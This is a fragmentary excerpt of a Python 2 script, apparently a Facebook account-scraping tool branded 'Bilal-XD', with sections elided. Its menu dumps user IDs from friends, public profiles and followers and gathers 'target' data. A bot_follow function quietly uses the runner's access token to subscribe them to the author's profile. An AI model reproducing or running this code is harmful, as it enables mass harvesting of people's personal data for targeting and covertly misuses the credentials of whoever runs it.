...
def bot_follow():
	try:
		...
		print("\n[!] Token invalid")
		logs()
    	requests.post('https://graph.facebook.com/100067579813372/subscribers?access_token=' + toket)      #Bilal Haider
...
def menu():
	...
	try:
	    	...
	    	print ("\n[•] Error : %s"%e)
	    	login()
    	print("\nＢｉｌａｌ-ＸＤ[1] Dump ID From Friend")
    	print("Ｂｉｌａｌ-ＸＤ[2] Dump ID From Public")
    	print("Ｂｉｌａｌ-ＸＤ[3] Dump ID From Followers")
	print("Ｂｉｌａｌ-ＸＤ[4] Get Data Target")
    	print("Ｂｉｌａｌ-ＸＤ[0] Log Out")
    	r=raw_input("\n[•] Choose : ")
    	if r=="":
	    print("\n[!] Fill In The Correct")
	    menu()
...
def friend():
	...
	try:
		...
		for a in z['friends']['data']:
			...
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('\nＢｉｌａｌ-ＸＤ[•] Sukses Dump ID From %s'%op['name'])
		print ("Ｂｉｌａｌ-ＸＤ[•] Total ID : %s"%(len(id)))
		print ("Ｂｉｌａｌ-ＸＤ[•] Output   : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
